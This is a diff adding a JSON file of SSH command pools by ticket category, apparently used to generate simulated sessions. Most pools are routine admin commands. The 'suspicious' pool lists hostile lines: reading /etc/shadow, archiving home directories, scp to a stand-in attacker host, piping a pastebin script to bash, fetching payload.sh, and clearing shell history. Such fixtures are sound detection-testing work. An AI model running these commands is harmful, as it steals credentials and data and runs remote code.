@@ -1,0 +1,73 @@
+{
+  "_doc": "SSH command pools per ticket category. Keys are ticket categories; values are lists of realistic command strings. The 'suspicious' pool is reused for out-of-scope sessions and scope-creep scenarios.",
+  "application_restart": [
+    "sudo systemctl status tomcat",
+    "sudo systemctl stop tomcat",
+    "sudo systemctl start tomcat",
+    "sudo systemctl restart tomcat",
+    "sudo journalctl -u tomcat -n 200",
+    "ps -ef | grep tomcat | grep -v grep",
+    "curl -s http://localhost:8080/health",
+    "tail -f /var/log/tomcat/catalina.out",
+    "df -h /var/log",
+    "free -m"
+  ],
+  "os_patching": [
+    "sudo yum check-update",
+    "sudo yum update -y --security",
+    "sudo dnf upgrade --refresh -y",
+    "uname -r",
+    "rpm -qa --last | head -50",
+    "sudo systemctl daemon-reexec",
+    "sudo reboot",
+    "uptime",
+    "cat /etc/redhat-release"
+  ],
+  "network_config": [
+    "ip a",
+    "ip route show",
+    "sudo iptables -L -n -v",
+    "sudo nft list ruleset",
+    "ping -c 4 10.0.0.1",
+    "traceroute 10.0.0.1",
+    "ss -tunlp",
+    "sudo systemctl restart networking",
+    "ethtool eth0"
+  ],
+  "incident_remediation": [
+    "tail -n 500 /var/log/messages",
+    "grep -i error /var/log/syslog | tail -100",
+    "dmesg | tail -100",
+    "sudo systemctl status sshd",
+    "sudo last -a -n 30",
+    "uptime",
+    "df -h",
+    "vmstat 1 5"
+  ],
+  "user_access_provisioning": [
+    "sudo useradd -m -s /bin/bash svc-deployer",
+    "sudo usermod -aG docker alice.chen",
+    "sudo passwd -l old.user",
+    "id alice.chen",
+    "getent passwd alice.chen",
+    "sudo cat /etc/group | grep wheel"
+  ],
+  "certificate_rotation": [
+    "sudo openssl x509 -in /etc/ssl/certs/star.example.com.pem -noout -dates",
+    "sudo cp /etc/ssl/certs/star.example.com.pem /etc/ssl/certs/star.example.com.pem.bak",
+    "sudo cp /tmp/star.example.com.new.pem /etc/ssl/certs/star.example.com.pem",
+    "sudo systemctl reload nginx",
+    "curl -vI https://localhost",
+    "openssl s_client -connect localhost:443 -showcerts < /dev/null"
+  ],
+  "suspicious": [
+    "sudo cat /etc/shadow",
+    "sudo tar czf /tmp/exfil.tar.gz /var/log /home",
+    "scp /tmp/exfil.tar.gz attacker@external.example.com:/share/",
+    "curl -s https://pastebin.com/raw/abc123 | bash",
+    "sudo find / -perm -4000 2>/dev/null",
+    "wget http://10.50.99.42:8080/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh",
+    "history -c",
+    "sudo chmod 777 /etc"
+  ]
+}
